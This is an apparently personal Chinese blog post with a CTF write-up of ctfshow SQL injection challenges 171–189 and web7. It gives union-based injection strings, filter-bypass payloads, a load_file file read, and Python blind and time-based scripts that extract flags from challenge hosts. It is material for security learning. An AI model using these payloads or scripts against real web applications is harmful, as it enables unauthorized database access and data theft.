@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    ctfshow入门sql注入部分 |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-[ctfshow入门sql注入部分]"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ctfshow入门sql注入部分
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/01/01/%5Bctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86%5D/" class="article-date">
+  <time datetime="2021-01-01T04:58:15.000Z" itemprop="datePublished">2021-01-01</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/">刷题站</a> / <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/ctfshow/">ctfshow</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.8k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">14 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p><strong>ctfshow web入门 sql注入部分(不断更新)</strong></p>
+<span id="more"></span>
+
+<h2 id="171"><a href="#171" class="headerlink" title="171"></a>171</h2><p>观察可以采用报错注入，无任何过滤，观察发现是 ‘ 的闭合</p>
+<p>select测试字段，发现字段为2个</p>
+<p>1.查库：<code>100&#39; union select 1,2,database() --+</code> </p>
+<p>2.查表：<code>100’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
+<p>3.查字段：<code>100&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39; --+</code></p>
+<p>4.查值： <code>100&#39; union select 1,2,group_concat(id,0x3a,username,0x3a,password) from ctfshow_web.ctfshow_user --+</code></p>
+<h2 id="172"><a href="#172" class="headerlink" title="172"></a>172</h2><p>1.和上一题一样，唯一不同的就是字段数不一样，字段数为2</p>
+<h2 id="173"><a href="#173" class="headerlink" title="173"></a>173</h2><p>过滤了 flag</p>
+<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>采用hex() 函数，将flag进行16进制转换</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DCAtTs"><img src="https://s3.ax1x.com/2020/11/14/DCAtTs.png" alt="DCAtTs.png"></a></p>
+<p><strong>payload:</strong><code>100 &#39; union select id,hex(username),hex(password)from ctfshow_web.ctfshow_user3 --+</code></p>
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>采用right()函数 进行字符串截取  注意是从右往左进行字符串截取，所以我们需要猜测flag的长度，测试得知截取从左往右第40个可以成功 绕过</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DCAlSf"><img src="https://s3.ax1x.com/2020/11/14/DCAlSf.png" alt="DCAlSf.png"></a></p>
+<p><strong>payload:</strong><code>100 &#39; union select id,hex(username),right(password,40)from ctfshow_web.ctfshow_user3 --+</code></p>
+<h2 id="174"><a href="#174" class="headerlink" title="174"></a>174</h2><p>过滤了数字和flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常思路就是使用base64编码 再将得到的数字就行替换</p>
+<p>这里用py脚本 因为抓包的时候发现id 等于1时候会有 admin 直接使用盲注脚本</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/siHhi8"><img src="https://s3.ax1x.com/2021/01/04/siHhi8.png" alt="siHhi8.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,45):</span><br><span class="line">	for j in r&#x27;01234556789abcdefghijklmnopqrstuvwxyz&#123;&#125;-=+-)(&#123;&#125;[]&#x27;:</span><br><span class="line">		url = &quot;http://db9eb41a-dfb3-4755-a125-0ab3d0a63455.chall.ctf.show//api/v4.php?id=&quot;</span><br><span class="line">		# kv=&#123;&#x27;id&#x27;: &#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;% (i,j)&#125;</span><br><span class="line">		payload = &#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;% (i,j)</span><br><span class="line">		# payload = &#x27;&#x27;&#x27; 1&#x27; and substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;% (i,j)</span><br><span class="line">		# r = requests.request(&#x27;GET&#x27;,url+payload)</span><br><span class="line">		r = requests.get(url+payload)</span><br><span class="line">		if &#x27;admin&#x27; in r.text:</span><br><span class="line">			flag += j</span><br><span class="line">			print(flag)</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面这个是二分法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://89131c15-02f2-4e9e-af2e-52bba0caf930.chall.ctf.show/api/v4.php?id=1&#x27; and &quot;</span><br><span class="line"></span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        payload = &#x27;if(ascii(substr((select  password from ctfshow_user4 where username =&quot;flag&quot;),%d,1))&gt;%d,1,0) -- A&#x27; %(i,mid)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        if &quot;admin&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(tail)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="175"><a href="#175" class="headerlink" title="175"></a>175</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/[\x00-\x7f]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
+
+<p>过滤了所有字符，使用时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;&#x27;&#x27;http://0678bdc2-b83b-4ee4-a079-7bf987b8b407.chall.ctf.show/api/v5.php?id=1&#x27; &#x27;&#x27;&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in r&#x27;01234556789abcdefghijklmnopqrstuvwxyz&#123;&#125;-=+-)(&#123;&#125;[]&#x27;:</span><br><span class="line">        #开始计时</span><br><span class="line">        before_time = time.time()</span><br><span class="line">        payload = &#x27;and if(substr((select password from ctfshow_user5 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;,sleep(3),0)--+&#x27;% (i,j)</span><br><span class="line">        r = requests.get(url+ payload)</span><br><span class="line">        #返回时间</span><br><span class="line">        after_time = time.time()</span><br><span class="line">        offset = after_time - before_time</span><br><span class="line">        if offset &gt; 2.8:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>大佬的二分法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># @Author:Y4tacker</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1&#x27; and &quot;</span><br><span class="line"></span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        payload = f&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#x27;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url + payload, timeout=0.5)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="176"><a href="#176" class="headerlink" title="176"></a>176</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>万能密码<br><code>1&#39; or 1=1--+</code>然后最后一行发现了<code>flag</code></p>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>首先输入，发现返回出错，估计是有过滤<br><code>1&#39; union select 1,2,3--+</code><br>尝试大小写<br><code>1&#39; uNion sElect 1,2,3--+</code>发现有回显了<br>然后直接查flag<br><code>1&#39; uNion sElect 1,2,password from ctfshow_user --+</code></p>
+<h2 id="177"><a href="#177" class="headerlink" title="177"></a>177</h2><p>解法一</p>
+<p>空格过滤了<code>/**/</code>绕过<br><code>1&#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#39;flag&#39;%23</code></p>
+<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>万能密码<br><code>1&#39;or&#39;1&#39;=&#39;1&#39;%23</code></p>
+<h2 id="178"><a href="#178" class="headerlink" title="178"></a>178</h2><h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>过滤了空格与*号等用<code>%09</code>绕过 (%09 为 TAB键)<br><code>1&#39;%09union%09select%091,2,3%23</code><br>之后一把梭得到flag<code>1&#39;%09union%09select%091,2,password%09from%09ctfshow_user%23</code></p>
+<h3 id="解法二-2"><a href="#解法二-2" class="headerlink" title="解法二"></a>解法二</h3><p>万能密码<br><code>1&#39;or&#39;1&#39;=&#39;1&#39;%23</code></p>
+<h2 id="179"><a href="#179" class="headerlink" title="179"></a>179</h2><h2 id="解法一-2"><a href="#解法一-2" class="headerlink" title="解法一"></a>解法一</h2><p><code>1&#39;or&#39;1&#39;=&#39;1&#39;%23</code></p>
+<h2 id="解法二-3"><a href="#解法二-3" class="headerlink" title="解法二"></a>解法二</h2><p>这次还把<code>%09</code>过滤了，测试了下发现<code>%0c</code>可以绕过(%0c为换行)<br><code>1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</code></p>
+<h2 id="180-182"><a href="#180-182" class="headerlink" title="180-182"></a>180-182</h2><p><strong>sql</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>把所有空格都过滤了,注释也被过滤了</p>
+<p><code>&#39;or(mid(password,1,1)=&#39;f&#39;)and&#39;1&#39;=&#39;1</code> </p>
+<p>测试如下</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/su3qAI"><img src="https://s3.ax1x.com/2021/01/08/su3qAI.png" alt="su3qAI.png"></a></p>
+<p>分析一下这个payload </p>
+<p>我们只能查询一语句,所以我们需要精确定位，因为都知道password是flag{xxx}，所以使用sql中的mid函数截取</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sEDm4I"><img src="https://s3.ax1x.com/2021/01/06/sEDm4I.png" alt="sEDm4I.png"></a></p>
+<p>再说一下limit函数  limit 1代表的是只筛选一条数据，limit 2就代表筛选2条数据， limit 0,1代表是从最开始 筛选一条数据，也就是只筛选第一条数据，limit 1,1代表只筛选第二条数据</p>
+<h2 id="183"><a href="#183" class="headerlink" title="183"></a>183</h2><p>提示post表名，尝试 tableName=ctfshow_use有回显，过滤了所有空格</p>
+<p>脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url =&#x27;http://282eda84-f050-4cb1-a827-866244652a85.chall.ctf.show/select-waf.php&#x27;</span><br><span class="line">flagstr=r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span><br><span class="line"></span><br><span class="line">flag1=&quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">	for j in flagstr:</span><br><span class="line">		payload =f&quot;(ctfshow_user)where(substr(pass,&#123;i&#125;,1))regexp(&#x27;&#123;j&#125;&#x27;)&quot;</span><br><span class="line">		data=&#123;</span><br><span class="line">		&quot;tableName&quot;:payload</span><br><span class="line">		&#125;</span><br><span class="line">		r=requests.post(url,data=data)</span><br><span class="line">		if (&quot;$user_count = 1;&quot;) in r.text:</span><br><span class="line">		    flag1 += j</span><br><span class="line">		    print(flag1)</span><br><span class="line">		    break</span><br><span class="line">print(f&quot;flag is &#123;flag1&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="184"><a href="#184" class="headerlink" title="184"></a>184</h2><p>使用<code>right join</code>连接查询,第一次用，向大佬学习了！！</p>
+<p>还过滤了 单引号 使用char()函数</p>
+<p>脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://f15ac2ca-94b7-4257-a52a-00e52ecee805.chall.ctf.show/select-waf.php&quot;</span><br><span class="line"></span><br><span class="line">flag = &#x27;flag&#123;&#x27;</span><br><span class="line">for i in range(45):</span><br><span class="line">    if i &lt;= 5:</span><br><span class="line">        continue</span><br><span class="line">    for  j in range(127):</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;tableName&quot;: f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;i&#125;,1)regexp(char(&#123;j&#125;)))&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if r.text.find(&quot;$user_count = 43;&quot;)&gt;0:</span><br><span class="line">            if chr(j) != &quot;.&quot;:</span><br><span class="line">                flag += chr(j)</span><br><span class="line">                print(flag.lower())</span><br><span class="line">                if chr(j) == &quot;&#125;&quot;:</span><br><span class="line">                    exit(0)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>
+
+<h2 id="185-186"><a href="#185-186" class="headerlink" title="185-186"></a>185-186</h2><p>185过滤了数字，需要找字母代替数字</p>
+<p>大佬的图</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/slkv2d"><img src="https://s3.ax1x.com/2021/01/10/slkv2d.png" alt="slkv2d.png"></a></p>
+<p>我们这里使用true来替换所有数字</p>
+<p>脚本在上一题的基础上修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://78e5352b-0016-4705-8c3c-ee1da671cd73.chall.ctf.show/select-waf.php&quot;</span><br><span class="line"></span><br><span class="line">flag = &#x27;flag&#123;&#x27;</span><br><span class="line">def createnum(n):</span><br><span class="line">	num = &#x27;true&#x27;</span><br><span class="line">	if n==1:</span><br><span class="line">		return &#x27;true&#x27;</span><br><span class="line">	else:</span><br><span class="line">		for i in range(n-1):</span><br><span class="line">			num+=&#x27;+true&#x27;</span><br><span class="line">	return num</span><br><span class="line"># print(createnum(3))</span><br><span class="line">for i in range(45):</span><br><span class="line">    if i &lt;= 5:</span><br><span class="line">        continue</span><br><span class="line">    for  j in range(127):</span><br><span class="line">        # data = &#123;</span><br><span class="line">        #     &quot;tableName&quot;: f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;createnum(i)&#125;,createnum(1))regexp(char(&#123;createnum(j)&#125;)))&quot;</span><br><span class="line">        # &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">        &quot;tableName&quot;: f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;createnum(i)&#125;,&#123;createnum(1)&#125;)regexp(char(&#123;createnum(j)&#125;)))&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if r.text.find(&quot;$user_count = 43;&quot;)&gt;0:</span><br><span class="line">            if chr(j) != &quot;.&quot;:</span><br><span class="line">                flag += chr(j)</span><br><span class="line">                print(flag.lower())</span><br><span class="line">                if chr(j) == &quot;&#125;&quot;:</span><br><span class="line">                    exit(0)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="187"><a href="#187" class="headerlink" title="187"></a>187</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$password = md5($_POST[&#x27;password&#x27;],true);</span><br><span class="line">用户名填写 admin 密码为 ffifdyop</span><br></pre></td></tr></table></figure>
+
+<p>具体原理参考ctfshow web9</p>
+<h2 id="188"><a href="#188" class="headerlink" title="188"></a>188</h2><p><strong>sql</strong>: $sql = “select pass from ctfshow_user where username = {$username}”;</p>
+<p><strong>waf</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//用户名检测</span><br><span class="line"> if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;, $username))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码检测</span><br><span class="line"> if(!is_numeric($password))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码判断</span><br><span class="line"> if($row[&#x27;pass&#x27;]==intval($password))&#123;</span><br><span class="line">     $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">     array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:username:0  或者 1&lt;1 (只要是让返回值是0的大部分都可以)</span><br><span class="line">        password:0</span><br></pre></td></tr></table></figure>
+
+<p>密码为弱类型比较</p>
+<p><strong>用户名= 0的情况下选择SELECT * FROM Table显示所有行</strong>  <a target="_blank" rel="noopener" href="https://www.coder.work/article/4005401">参考:</a></p>
+<p>测试</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/s8pmi4"><img src="https://s3.ax1x.com/2021/01/11/s8pmi4.png" alt="s8pmi4.png"></a></p>
+<h2 id="189"><a href="#189" class="headerlink" title="189"></a>189</h2><p>也是一个很有意思的题目。我对于load_file的认知一直就是select load_file(xxxx),通过select查询来把文件内容读出来。所以看到题干：flag在api/index.php文件中，我的第一反应就是联合查询读文件。但是进入环境才发现又是这样没回显的题目，而且还把select给ban了，感觉不太可能是load_file。后来想了很久实在没法子又去往load_file去靠，突然想到可以盲注读flag：username=if((load_file(‘/var/www/html/api/index.php’))regexp(‘ctfshow{‘),0,1)&amp;password=2<br>username=0是上一题的姿势，为0返回的是密码错误，是1返回的就是查询失败。正常不会往盲注这边想，是因为要盲注一整个文件太耗时，不可能出这种题目。但是如果只是盲注出这个文件中的flag，那就很简单了。写个</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://313b5bc7-3d59-4590-93b8-d2b4e834e62b.chall.ctf.show:8080/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:</span><br><span class="line">        payload=<span class="string">&quot;if((load_file(&#x27;/var/www/html/api/index.php&#x27;))regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>剩下可参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113664639">https://blog.csdn.net/rfrder/article/details/113664639</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113759746">https://blog.csdn.net/rfrder/article/details/113759746</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/110144623">https://blog.csdn.net/solitudi/article/details/110144623</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/recharging-runtime/p/15077477.html">https://www.cnblogs.com/recharging-runtime/p/15077477.html</a></p>
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>我一直在想，如果关键字被过滤了，怎么去判读字段长度？</p>
+<p>其实盲注的话，貌似就没有这个麻烦了</p>
+<p>做题之前先判断哪些关键字被过滤了，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1&#x27;or1=1#</span><br><span class="line">index.php?id=1&#x27;or 1=1#</span><br></pre></td></tr></table></figure>
+
+<p>一碰到空格就报错，空格被过滤用 /**/绕过</p>
+<p><strong>1.爆库名（web7）</strong><br>当输入为<code>id=-1/**/or/**/ascii(substr(database(),1,1))=119</code>时出现文章内容，证明库名的第一个字符为‘w’,以此类推。</p>
+<p><strong>2.爆表名（flag,page,user）</strong></p>
